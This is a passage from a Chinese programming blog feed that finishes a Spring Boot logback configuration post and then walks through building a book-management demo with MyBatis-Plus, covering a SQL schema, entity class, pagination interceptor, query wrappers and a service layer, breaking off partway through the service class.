    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;stdout&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.ConsoleAppender&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dev&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">springProfile</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;!dev&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss E&#125; %level [%thread]-%class[%line]: %msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">springProfile</span>&gt;</span>
            <span class="hljs-comment">&lt;!--日志的编码格式--&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">appender</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;timeFile&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.RollingFileAppender&quot;</span>&gt;</span>
        <span class="hljs-comment">&lt;!--TimeBasedRollingPolicy  基于时间的滚动策略--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">rollingPolicy</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ch.qos.logback.core.rolling.TimeBasedRollingPolicy&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">fileNamePattern</span>&gt;</span>log/log-%d&#123;yyyy-MM-dd-HH&#125;.log<span class="hljs-tag">&lt;/<span class="hljs-name">fileNamePattern</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">rollingPolicy</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">encoder</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d&#123;yyyy-MM-dd-HH:mm:ss.SSS&#125; %level [%thread]-%class:%line&gt;&gt;%msg%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">charset</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">charset</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">encoder</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">appender</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">root</span> <span class="hljs-attr">level</span>=<span class="hljs-string">&quot;info&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;stdout&quot;</span>/&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">appender-ref</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">&quot;timeFile&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre>

<h2 id="在sercie实现类创建Logger对象，输⼊⽇志"><a href="#在sercie实现类创建Logger对象，输⼊⽇志" class="headerlink" title="在sercie实现类创建Logger对象，输⼊⽇志"></a>在sercie实现类创建Logger对象，输⼊⽇志</h2><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220719162517298.png" alt="image-20220719162517298"></p>
<p>日志会被记录到项目的/log目录下，且是按每日记录</p>
<pre><code class="hljs xml">log/log-%d&#123;yyyy-MM-dd-HH&#125;.log</code></pre>



]]></content>
      <categories>
        <category>javaweb</category>
      </categories>
      <tags>
        <tag>springboot</tag>
      </tags>
  </entry>
  <entry>
    <title>springboot_demo</title>
    <url>/2022/04/17/springboot-demo/</url>
    <content><![CDATA[<h1 id="springboot-demo"><a href="#springboot-demo" class="headerlink" title="springboot demo"></a>springboot demo</h1><p>使用springboot整合SSMP</p>
<h2 id="1-项目需求"><a href="#1-项目需求" class="headerlink" title="1.项目需求"></a>1.项目需求</h2><p>项目最终实现的页面</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417232613669.png" alt="image-20220417232613669"></p>
<p>​    整体案例中需要采用的技术如下：</p>
<blockquote>
<ol>
<li>Dao开发————整合MyBatisPlus，制作数据层测试</li>
<li>Service开发————基于MyBatisPlus进行增量开发，制作业务层测试类</li>
<li>Controller开发————基于Restful开发，使用PostMan测试接口功能</li>
<li>Controller开发————前后端开发协议制作</li>
<li>页面开发————基于VUE+ElementUI制作，前后端联调，页面数据处理，页面消息处理<ul>
<li>列表</li>
<li>新增</li>
<li>修改</li>
<li>删除</li>
<li>分页</li>
<li>查询</li>
</ul>
</li>
<li>项目异常处理</li>
<li>按条件查询————页面功能调整、Controller修正功能、Service修正功能</li>
</ol>
</blockquote>
<h2 id="2-创建springboot的web项目"><a href="#2-创建springboot的web项目" class="headerlink" title="2.创建springboot的web项目"></a>2.创建springboot的web项目</h2><h3 id="新建模块"><a href="#新建模块" class="headerlink" title="新建模块"></a>新建模块</h3><p><code>File-&gt;new-&gt;module</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214418622.png" alt="image-20220417214418622"></p>
<p>这里没什么需要改的，只需要修改使用的java版本</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214706594.png" alt="image-20220417214706594"></p>
<p>选择所需要的依赖，选择后springboot就可以自动导入相关坐标，无需手动导入</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220417214851951.png" alt="image-20220417214851951"></p>
<p>==注意将配置文件改为yml类型==</p>
<p><strong>application.yml</strong></p>
<pre><code class="hljs yaml"><span class="hljs-comment"># 修改配置将tomcat的端口改为80</span>
<span class="hljs-attr">server:</span> 
	<span class="hljs-attr">port:</span> <span class="hljs-number">80</span></code></pre>



<h2 id="3-开发流程"><a href="#3-开发流程" class="headerlink" title="3.开发流程"></a>3.开发流程</h2><h3 id="实体类开发"><a href="#实体类开发" class="headerlink" title="实体类开发"></a>实体类开发</h3><p>数据库资源</p>
<pre><code class="hljs sql"><span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-comment">-- Table structure for tbl_book</span>
<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `tbl_book`;
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `tbl_book`  (
  `id` <span class="hljs-type">int</span>(<span class="hljs-number">11</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span> AUTO_INCREMENT,
  `type` <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `name` <span class="hljs-type">varchar</span>(<span class="hljs-number">50</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  `description` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NULL</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,
  <span class="hljs-keyword">PRIMARY</span> KEY (`id`) <span class="hljs-keyword">USING</span> BTREE
) ENGINE <span class="hljs-operator">=</span> InnoDB AUTO_INCREMENT <span class="hljs-operator">=</span> <span class="hljs-number">51</span> <span class="hljs-type">CHARACTER</span> <span class="hljs-keyword">SET</span> <span class="hljs-operator">=</span> utf8 <span class="hljs-keyword">COLLATE</span> <span class="hljs-operator">=</span> utf8_general_ci ROW_FORMAT <span class="hljs-operator">=</span> <span class="hljs-keyword">Dynamic</span>;

<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-comment">-- Records of tbl_book</span>
<span class="hljs-comment">-- ----------------------------</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring实战 第5版&#x27;</span>, <span class="hljs-string">&#x27;Spring入门经典教程，深入理解Spring原理技术内幕&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5核心原理与30个类手写实战&#x27;</span>, <span class="hljs-string">&#x27;十年沉淀之作，手写Spring精华思想&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">3</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring 5 设计模式&#x27;</span>, <span class="hljs-string">&#x27;深入Spring源码剖析Spring源码中蕴含的10大设计模式&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Spring MVC+MyBatis开发从入门到项目实战&#x27;</span>, <span class="hljs-string">&#x27;全方位解析面向Web应用的轻量级框架，带你成为Spring MVC开发高手&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">5</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;轻量级Java Web企业应用实战&#x27;</span>, <span class="hljs-string">&#x27;源码级剖析Spring框架，适合已掌握Java基础的读者&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">6</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java核心技术 卷I 基础知识（原书第11版）&#x27;</span>, <span class="hljs-string">&#x27;Core Java 第11版，Jolt大奖获奖作品，针对Java SE9、10、11全面更新&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">7</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;深入理解Java虚拟机&#x27;</span>, <span class="hljs-string">&#x27;5个维度全面剖析JVM，大厂面试知识点全覆盖&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;Java编程思想（第4版）&#x27;</span>, <span class="hljs-string">&#x27;Java学习必读经典,殿堂级著作！赢得了全球程序员的广泛赞誉&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">9</span>, <span class="hljs-string">&#x27;计算机理论&#x27;</span>, <span class="hljs-string">&#x27;零基础学Java（全彩版）&#x27;</span>, <span class="hljs-string">&#x27;零基础自学编程的入门图书，由浅入深，详解Java语言的编程思想和核心技术&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播就该这么做：主播高效沟通实战指南&#x27;</span>, <span class="hljs-string">&#x27;李子柒、李佳琦、薇娅成长为网红的秘密都在书中&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">11</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播销讲实战一本通&#x27;</span>, <span class="hljs-string">&#x27;和秋叶一起学系列网络营销书籍&#x27;</span>);
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> `tbl_book` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">12</span>, <span class="hljs-string">&#x27;市场营销&#x27;</span>, <span class="hljs-string">&#x27;直播带货：淘宝、天猫直播从新手到高手&#x27;</span>, <span class="hljs-string">&#x27;一本教你如何玩转直播的书，10堂课轻松实现带货月入3W+&#x27;</span>);</code></pre>

<p><code>tbl_book</code>对应的实体类如下</p>
<pre><code class="hljs java"><span class="hljs-keyword">import</span> lombok.Data;
<span class="hljs-meta">@Data</span>
<span class="hljs-comment">// Data注解可以可以完成所有属性的setter getter toString，equals，hashCode方法</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Book</span> </span>&#123;
    <span class="hljs-keyword">private</span> Integer id;
    <span class="hljs-keyword">private</span> String type;
    <span class="hljs-keyword">private</span> String name;
    <span class="hljs-keyword">private</span> String description;
&#125;</code></pre>

<p>为了方便开发使用<code>lombok</code>注解，在pom.xml添加坐标</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!--lombok--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.projectlombok<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>lombok<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span></code></pre>



<h3 id="数据层开发-CRUD"><a href="#数据层开发-CRUD" class="headerlink" title="数据层开发-CRUD"></a>数据层开发-CRUD</h3><h4 id="1-导入mybatisplus、数据源、mysql驱动的坐标"><a href="#1-导入mybatisplus、数据源、mysql驱动的坐标" class="headerlink" title="(1) 导入mybatisplus、数据源、mysql驱动的坐标"></a>(1) 导入mybatisplus、数据源、mysql驱动的坐标</h4><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.baomidou<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.6<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>runtime<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span></code></pre>

<h4 id="2-在application-xml中配置数据源信息"><a href="#2-在application-xml中配置数据源信息" class="headerlink" title="(2)在application.xml中配置数据源信息"></a>(2)在application.xml中配置数据源信息</h4><pre><code class="hljs yaml">
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">datasource:</span>
    <span class="hljs-attr">druid:</span>
      <span class="hljs-attr">driver-class-name:</span> <span class="hljs-string">com.mysql.cj.jdbc.Driver</span>
      <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/javastudy?serverTimezone=UTC</span>
      <span class="hljs-attr">username:</span> <span class="hljs-string">root</span>
      <span class="hljs-attr">password:</span> <span class="hljs-string">root</span></code></pre>

<p>==若连接数据库出现时区错误时可以加上参数?serverTimezone=UTC==</p>
<h4 id="3-使用MyBatisPlus的标准通用接口BaseMapper加速开发"><a href="#3-使用MyBatisPlus的标准通用接口BaseMapper加速开发" class="headerlink" title="(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发"></a>(3)使用MyBatisPlus的标准通用接口BaseMapper加速开发</h4><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookDao</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">BaseMapper</span>&lt;<span class="hljs-title">Book</span>&gt; </span>&#123;
&#125;</code></pre>

<p>==注意==</p>
<p>对数据库操作时需要指定数据表的前缀，并设置主键增加的策略，这里使用自增</p>
<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>		<span class="hljs-comment">#设置表名通用前缀</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>				<span class="hljs-comment">#设置主键id字段的生成策略为参照数据库设定的策略，当前数据库设置id生成策略为自增</span></code></pre>

<p>设置mybatisPlus的日志显示格式</p>
<p>在进行数据层测试的时候，因为基础的CRUD操作均由MyBatisPlus给我们提供了，所以就出现了一个局面，开发者不需要书写SQL语句了，这样程序运行的时候总有一种感觉，一切的一切都是黑盒的，作为开发者我们啥也不知道就完了。如果程序正常运行还好，如果报错了，这个时候就很崩溃，你甚至都不知道从何下手，因为传递参数、封装SQL语句这些操作完全不是你开发出来的，所以查看执行期运行的SQL语句就成为当务之急。</p>
<p>可以添加日志配置</p>
<pre><code class="hljs yaml"><span class="hljs-attr">mybatis-plus:</span>
  <span class="hljs-attr">global-config:</span>
    <span class="hljs-attr">db-config:</span>
      <span class="hljs-attr">table-prefix:</span> <span class="hljs-string">tbl_</span>
      <span class="hljs-attr">id-type:</span> <span class="hljs-string">auto</span>
  <span class="hljs-attr">configuration:</span> <span class="hljs-comment"># 设置mybatisplus的日志为标准输入格式 可以显示执行的sql语句、携带的参数与查询结果</span>
    <span class="hljs-attr">log-impl:</span> <span class="hljs-string">org.apache.ibatis.logging.stdout.StdOutImpl</span></code></pre>

<h3 id="数据层开发-分页功能"><a href="#数据层开发-分页功能" class="headerlink" title="数据层开发-分页功能"></a>数据层开发-分页功能</h3><p>Mybatis-plus中已经实现了分页功能的API，具体使用方法如下</p>
<ul>
<li>创建Page对象，利用构造方法实例化所需的参数currentPage，pageSize</li>
<li>使用Mapper.selectPage()使用分页查询功能</li>
</ul>
<pre><code class="hljs java">IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
IPage page = bookDao.selectPage(page, <span class="hljs-keyword">null</span>);</code></pre>

<p>使用分页查询返回的结果仍是Page类型，其中包含多条数据，并且使用返回的结果可以获取到分页的详细信息，包括当前页，总记录数，当前页记录数，前一页等</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetPage</span><span class="hljs-params">()</span></span>&#123;
    IPage page = <span class="hljs-keyword">new</span> Page(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);
    bookDao.selectPage(page, <span class="hljs-keyword">null</span>);
    System.out.println(page.getCurrent());		<span class="hljs-comment">//当前页码值</span>
    System.out.println(page.getSize());			<span class="hljs-comment">//每页显示数</span>
    System.out.println(page.getTotal());		<span class="hljs-comment">//数据总量</span>
    System.out.println(page.getPages());		<span class="hljs-comment">//总页数</span>
    System.out.println(page.getRecords());		<span class="hljs-comment">//详细数据</span>
&#125;</code></pre>

<p>但是在使用分页功能时需要设置一个拦截器，基础操作中有查询全部的功能，而在这个基础上只需要升级一下（PLUS）就可以得到分页操作。所以MyBatisPlus将分页操作做成了一个开关，你用分页功能就把开关开启，不用就不需要开启这个开关。而我们现在没有开启这个开关，所以分页操作是没有的。这个开关是通过MyBatisPlus的拦截器的形式存在的。</p>
<pre><code class="hljs java"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MPConfig</span> </span>&#123;
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> MybatisPlusInterceptor <span class="hljs-title">mybatisPlusInterceptor</span><span class="hljs-params">()</span></span>&#123;
        MybatisPlusInterceptor interceptor = <span class="hljs-keyword">new</span> MybatisPlusInterceptor();
        interceptor.addInnerInterceptor(<span class="hljs-keyword">new</span> PaginationInnerInterceptor());
        
       <span class="hljs-comment">// 当需要其他的拦截器时继续addInnerInterceptor即可</span>
       <span class="hljs-comment">// 如果后期开发其他功能，需要添加全新的拦截器，按照第二行的格式继续add进去新的拦截器就可以了。</span>
        <span class="hljs-keyword">return</span> interceptor;
    &#125;
&#125;</code></pre>



<h3 id="数据层开发-条件查询"><a href="#数据层开发-条件查询" class="headerlink" title="数据层开发-条件查询"></a>数据层开发-条件查询</h3><p>MyBatisPlus将这些操作都制作成API接口，调用一个又一个的方法就可以实现各种条件的拼装。使用方法如下</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy</span><span class="hljs-params">()</span></span>&#123;
    QueryWrapper&lt;Book&gt; qw = <span class="hljs-keyword">new</span> QueryWrapper&lt;&gt;();
    qw.like(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;Spring&quot;</span>);
    bookDao.selectList(qw);
&#125;</code></pre>

<p>其中第一句QueryWrapper对象是一个用于封装查询条件的对象，该对象可以动态使用API调用的方法添加条件，最终转化成对应的SQL语句。第二句就是一个条件了，需要什么条件，使用QueryWapper对象直接调用对应操作即可。上述代码中执行的SQL语句为<code>select * from tbl_book where name like &#39;%spring%&#39;</code>，MP自动对查询条件进行处理，省去了手动处理的一步。</p>
<p>MyBatisPlus针对字段检查进行了功能升级，全面支持Lambda表达式，就有了下面这组API。由QueryWrapper对象升级为LambdaQueryWrapper对象，其使用方法如下：</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;
    String name = <span class="hljs-string">&quot;1&quot;</span>;
    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();
    lqw.like(Book::getName,name);
    bookDao.selectList(lqw);
&#125;</code></pre>

<p>为了便于开发者动态拼写SQL，防止将null数据作为条件使用，MyBatisPlus还提供了动态拼装SQL的快捷书写方式。</p>
<pre><code class="hljs java"><span class="hljs-meta">@Test</span>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">testGetBy2</span><span class="hljs-params">()</span></span>&#123;
    String name = <span class="hljs-string">&quot;1&quot;</span>;
    LambdaQueryWrapper&lt;Book&gt; lqw = <span class="hljs-keyword">new</span> LambdaQueryWrapper&lt;Book&gt;();
    <span class="hljs-comment">//if(name != null) lqw.like(Book::getName,name);		//方式一：JAVA代码控制</span>
    lqw.like(name != <span class="hljs-keyword">null</span>,Book::getName,name);				<span class="hljs-comment">//方式二：API接口提供控制开关</span>
    bookDao.selectList(lqw);
&#125;</code></pre>



<h3 id="业务层开发"><a href="#业务层开发" class="headerlink" title="业务层开发"></a>业务层开发</h3><p>定义业务层的接口<code>BookService</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">BookService</span> </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span></span>;
    <span class="hljs-function"><span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span></span>;

    <span class="hljs-function">List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span></span>;
    <span class="hljs-function">Book <span class="hljs-title">getById</span><span class="hljs-params">(Integer id)</span></span>;

    <span class="hljs-function">IPage&lt;Book&gt; <span class="hljs-title">getPage</span><span class="hljs-params">(<span class="hljs-keyword">int</span> currentPage, <span class="hljs-keyword">int</span> pageSize)</span></span>;

&#125;</code></pre>

<p>业务层接口的实现类</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.service.impl;

<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.core.metadata.IPage;
<span class="hljs-keyword">import</span> com.baomidou.mybatisplus.extension.plugins.pagination.Page;
<span class="hljs-keyword">import</span> com.sunzy.dao.BookDao;
<span class="hljs-keyword">import</span> com.sunzy.domain.Book;
<span class="hljs-keyword">import</span> com.sunzy.service.BookService;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-comment">// 注册为数据逻辑层的bean</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BookServiceImpl2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">BookService</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> BookDao bookDao;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">save</span><span class="hljs-params">(Book book)</span> </span>&#123;
        <span class="hljs-keyword">return</span> bookDao.insert(book) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">update</span><span class="hljs-params">(Book book)</span> </span>&#123;
        <span class="hljs-keyword">return</span> bookDao.updateById(book) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">delete</span><span class="hljs-params">(Integer id)</span> </span>&#123;
        <span class="hljs-keyword">return</span> bookDao.deleteById(id) &gt; <span class="hljs-number">0</span>;
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Book&gt; <span class="hljs-title">getAll</span><span class="hljs-params">()</span> </span>&#123;
        <span class="hljs-keyword">return</span> bookDao.selectList(<span class="hljs-keyword">null</span>);
    &#125;

    <span class="hljs-meta">@Override</span>
